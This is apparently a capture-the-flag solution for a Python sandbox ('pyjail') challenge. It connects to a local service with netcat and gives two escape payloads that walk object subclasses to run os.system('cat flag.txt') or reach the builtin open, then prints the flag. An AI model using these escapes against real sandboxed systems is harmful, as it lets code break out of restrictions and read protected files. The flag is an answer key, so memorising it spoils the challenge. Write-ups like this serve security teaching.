# Solution: pyjail-escape

Connect to the service:

```bash
nc localhost 16000
```

Escape Python sandbox by accessing object subclasses and reading `flag.txt`:

```python
().__class__.__bases__[0].__subclasses__()[104].load_module('os').system('cat flag.txt')
```

Or using `open`:

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('flag.txt').read()
```

Flag: `mctf{pyth0n_j41lbr34k_3sc4p3_succ3ss}`
